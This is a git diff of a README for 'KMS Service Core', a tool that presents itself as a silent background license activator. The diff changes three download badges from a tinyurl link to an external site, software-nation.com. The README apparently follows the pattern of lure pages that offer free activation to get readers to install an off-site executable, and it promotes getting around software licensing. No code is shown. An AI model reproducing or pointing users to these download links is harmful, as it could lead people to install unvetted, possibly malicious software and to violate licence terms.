@@ -9,7 +9,7 @@ The **⚙️ KMS Service Core** is a lightweight background activation service t
 
 <div align="center">
 
-[![Download KMS Service Core](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/kms-service-core)
+[![Download KMS Service Core](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/kms-service-core)
 
 </div>
 
@@ -95,7 +95,7 @@ KMS activation lasts only 180 days. After that, you need to re-activate. Most pe
 4. **✅ Follow setup wizard** — click Install
 5. **🚀 Service starts automatically** — no further action needed
 
-[![Download KMS Service Core](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/kms-service-core)
+[![Download KMS Service Core](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/kms-service-core)
 
 ### One-Time Activation (During Install)
 
@@ -224,7 +224,7 @@ Install once. Activate forever. **KMS Service Core** runs silently in the backgr
 
 <div align="center">
 
-[![Download KMS Service Core](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/kms-service-core)
+[![Download KMS Service Core](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/kms-service-core)
 
 **Version 3.1.0** — Background activation service. Free forever.
 
